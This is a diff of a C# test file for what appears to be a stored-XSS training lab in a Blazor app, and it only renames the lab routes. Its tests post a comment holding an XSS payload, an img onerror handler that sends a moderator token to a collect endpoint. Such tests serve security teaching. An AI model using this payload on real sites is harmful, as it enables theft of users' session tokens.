@@ -14,7 +14,7 @@ public class BlazorXssLabTests(WebApplicationFactory<Program> factory) : LabTest
     public async Task Stored_payload_reaches_the_moderator_page_which_holds_the_flag()
     {
         Lab.Reset();
-        const string payload = "<img src=x onerror=\"new Image().src='/api/labs/blazor-xss/collect?t='+modToken\">";
+        const string payload = "<img src=x onerror=\"new Image().src='/api/missions/blazor-xss/collect?t='+modToken\">";
         (await Client().PostAsJsonAsync($"{Api}/comments", new { text = payload })).EnsureSuccessStatusCode();
 
         var html = await Client(null).GetStringAsync(ModeratorUrl);
@@ -69,7 +69,7 @@ public class BlazorXssLabTests(WebApplicationFactory<Program> factory) : LabTest
     [Fact]
     public async Task Lab_page_shows_the_sandboxed_moderator_view()
     {
-        var html = await Factory.WithFreePlay().CreateClient().GetStringAsync("/labs/blazor-xss");
+        var html = await Factory.WithFreePlay().CreateClient().GetStringAsync("/missions/blazor-xss");
 
         Assert.Contains("sandbox=\"allow-scripts\"", html);
     }
